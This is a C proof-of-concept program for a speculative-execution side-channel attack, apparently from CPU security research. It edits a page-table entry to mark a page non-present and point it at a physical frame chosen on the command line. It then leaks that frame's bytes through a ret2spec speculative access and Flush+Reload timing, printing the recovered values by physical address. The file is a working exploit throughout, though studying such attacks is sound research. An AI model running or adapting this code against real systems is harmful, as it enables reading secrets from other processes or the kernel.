#include "constants.h"
#include "flush_and_reload.h"
#include "ret2spec.h"
#include <bits/types/siginfo_t.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <ucontext.h>
#include <unistd.h>

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-function"
#include "ptedit_header.h"
#pragma GCC diagnostic pop

#include <assert.h>

static void segfault_handler(int signum, siginfo_t *si, void *vcontext) {
  ucontext_t *context = (ucontext_t *)vcontext;
  context->uc_mcontext.gregs[16] = (uint64_t)(&ret2spec_end);
}

int main(int argc, char *argv[argc]) {
  // Step 1: Create a variable
  // Step 2: modify PTE to change make page containing that variable non-present
  //         optionally modify the PTE physical page
  // Step 3: FLUSH reload buffer
  // Step 4: Speculatively access variable
  // Step 5: RELOAD reload buffer

  void *leak = mmap(NULL, PAGE_SIZE, PROT_WRITE | PROT_READ,
                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

  assert(!ptedit_init());

  void *reload_buffer =
      mmap(NULL, VALUES_IN_BYTE * PAGE_SIZE, PROT_WRITE | PROT_READ,
           MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  assert(reload_buffer != MAP_FAILED);

  size_t threshold = 150;

  assert(argc >= 2);
  char *tail = NULL;
  size_t pfn = strtol(argv[1], &tail, 16);
  assert(tail != argv[1]);
  printf("Trying PFN of 0x%lx\n", pfn);

  assert(!mprotect(leak, PAGE_SIZE, PROT_NONE));
  size_t leak_original_pfn = ptedit_pte_get_pfn(leak, 0);
  ptedit_pte_clear_bit(leak, 0, PTEDIT_PAGE_BIT_PRESENT);
  ptedit_pte_set_pfn(leak, 0, pfn);
  // ptedit_pte_set_bit(leak, 0, PTEDIT_PAGE_BIT_GLOBAL);

  struct sigaction sa = {0};
  sa.sa_handler = segfault_handler;
  sa.sa_flags = SA_SIGINFO;
  sigaction(SIGSEGV, &sa, NULL);
  //
  // printf("Accessing invalid variable to bring it in TLB\n");
  // if (setjmp(deliberate_segfault)) {
  //   printf("Variable is %lx\n", *(uint64_t *)leak);
  // }
  // sa.sa_handler = SIG_DFL;
  // sigaction(SIGSEGV, &sa, NULL);

  memset(reload_buffer, 0, VALUES_IN_BYTE * PAGE_SIZE);

  for (int j = 0; j < PAGE_SIZE; j += 1) {
    size_t results[VALUES_IN_BYTE] = {0};
    void *leak_addr = (char *)leak + j;

    // printf("pfn after set %lx\n", ptedit_pte_get_pfn(leak, 0));

    for (int i = 0; i < 10; ++i) {
      flush(VALUES_IN_BYTE, PAGE_SIZE, reload_buffer);
      ret2spec(leak_addr, reload_buffer);
      reload(VALUES_IN_BYTE, PAGE_SIZE, reload_buffer, results, threshold);
    }

    for (size_t i = 0; i < VALUES_IN_BYTE; ++i) {
      if (results[i] > 0) {
        printf("Results physcial addr %lx:\t", (pfn << 12) | j);
        printf("0x%lx\t%ld\n", i, results[i]);
      }
    }
  }

  // Restore leak PFN
  ptedit_pte_set_pfn(leak, 0, leak_original_pfn);
  assert(!munmap(leak, PAGE_SIZE));
  assert(!munmap(reload_buffer, VALUES_IN_BYTE * PAGE_SIZE));
  ptedit_cleanup();
}
